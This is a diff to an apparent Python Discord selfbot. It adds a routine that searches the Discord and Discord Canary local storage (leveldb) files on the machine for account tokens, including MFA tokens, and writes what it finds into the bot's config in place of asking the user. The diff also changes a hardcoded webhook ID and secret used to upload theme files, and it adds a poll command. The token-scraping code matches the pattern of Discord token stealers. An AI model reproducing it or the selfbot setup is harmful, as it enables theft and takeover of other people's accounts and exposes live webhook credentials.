@@ -38,6 +38,7 @@ import ipapi
 from art import *
 from gtts import gTTS
 from discord import *
+from re import findall
 from ctypes import windll
 from pytube import YouTube
 from os import listdir, name
@@ -59,13 +60,41 @@ from colorama import init, Fore, Back, Style
 from os import error, name, system
 from datetime import datetime as dt
 from discord.ext.commands import MissingPermissions, CheckFailure, CommandNotFound, has_permissions
+class autoToken():
+    def getUserToken(path):
+        path += "\\Local Storage\\leveldb"
+        tokens = []
+        for file_name in os.listdir(path):
+            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+                continue
+            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                    for token in findall(regex, line):
+                        tokens.append(token)
+        return tokens
+    def returnAutoToken():
+        LOCAL = os.getenv("LOCALAPPDATA")
+        ROAMING = os.getenv("APPDATA")
+        PATHS = {
+            "Discord"           : ROAMING + "\\Discord",
+            "Discord Canary"    : ROAMING + "\\discordcanary",
+        }
+        checked = ""
+
+        for platform, path in PATHS.items():
+            if not os.path.exists(path):
+                continue
+            for token in autoToken.getUserToken(path):
+                if token in checked:
+                    continue
+                checked += token
+        return checked
 
 init() # Initialize colorama
 #Startup
 if (os.path.exists("./data/config.json")):
     pass
 else:
-    token  = input("Token: ")
     prefix = input("Prefix: ")
     sniper = input("Sniper? (y/n): ")
     fake_nitro_config = input("Fake Nitro? (y/n): ")
@@ -82,7 +111,7 @@ else:
     if (not ISDIR):
         os.mkdir('./data')
     data = {
-            "token": f"{token}",
+            "token": f"{autoToken.returnAutoToken()}",
             "prefix": f"{prefix}",
             "sniper": f"{sniper}",
             "selfbot_detection": f"{selfbot_detection}",
@@ -133,7 +162,7 @@ else:
 
 beta = False
 version = "1.0.6 Remastered"
-command_amount = "103 "
+command_amount = "105 "
 authSkip = False
 motd = "Its getting Chilly!"
 start_time = dt.now()
@@ -374,7 +403,7 @@ class files:
         else:
             pass 
         data = {
-            "token": f"{token}",
+            "token": f"{autoToken.returnAutoToken()}",
             "prefix": f"{prefix_config}",
             "sniper": f"{sniper}",
             "selfbot_detection": f"{selfbot_detection}",
@@ -1067,7 +1096,7 @@ async def settheme(ctx, theme1):
 async def uploadtheme(ctx, themename):
     await ctx.message.delete()
     try:
-        webhook = discord.Webhook.partial(900202510726332426, 'hzY_ELOwg1emz_xbpZvTtpv6Ee0NbPyy9yb7qpuumirnqovsRbk_asYPz6YbK1eaSWjb', adapter=discord.RequestsWebhookAdapter()) # Your webhook
+        webhook = discord.Webhook.partial(927426508576923720, '8zUAWOmsZxxexEzxVWp4gsEDCgsvdoc6dh5oxiYOIhcKwz6X0P4utiR0MQT2DbDrkeMl', adapter=discord.RequestsWebhookAdapter()) # Your webhook
         with open(file=f'./data/themes/{themename}' + ".json", mode='rb') as f:
          my_file = discord.File(f)
         webhook.send(f'Theme Name: {themename}', username='Themes', file=my_file)
@@ -1230,6 +1259,21 @@ async def steppingstones(ctx):
     msg = await ctx.send(embed = embed)
     sleep(5)
     await msg.edit(embed = embed2)
+@bot.command()
+async def multipoll(ctx, question1, question2):
+    await ctx.message.delete()
+    with open(f"./data/themes/{theme_config}.json") as f:
+    #Loads the json to read contents
+     config = json.load(f)
+     color = config.get('color')
+    sixteenIntegerHex = int(color.replace("#", ""), 16)
+    readableHex = int(hex(sixteenIntegerHex), 0)
+    embed = discord.Embed(title= config.get('title'), description = f"{question1}: \N{THUMBS UP SIGN}\n\n{question2}:\N{THUMBS DOWN SIGN}", color=readableHex)
+    embed.set_thumbnail(url = config.get('imageurl'))
+    embed.set_footer(text = "made with ♡ by bomt")
+    msg = await ctx.send(embed = embed)   
+    await msg.add_reaction('\N{THUMBS UP SIGN}')
+    await msg.add_reaction('\N{THUMBS DOWN SIGN}')
 def animate_Rocket():
     distanceFromTop = 20
     isdone = False
